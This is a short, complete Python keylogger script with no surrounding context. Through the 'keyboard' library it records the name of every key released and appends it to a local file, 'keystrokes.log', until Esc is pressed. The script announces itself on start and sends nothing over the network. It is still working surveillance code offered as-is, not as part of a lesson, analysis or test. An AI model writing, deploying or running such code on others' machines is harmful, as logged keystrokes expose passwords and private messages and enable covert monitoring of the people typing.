import keyboard

log_file = "keystrokes.log"

def on_key_event(event):
    with open(log_file, "a") as f:
        f.write(f"{event.name}\n")

def main():
    print("Keylogger started. Press 'Esc' to stop and exit.")
    keyboard.on_release(on_key_event)

    # Wait for 'Esc' key to stop the keylogger
    keyboard.wait("esc")

if __name__ == "__main__":
    main()
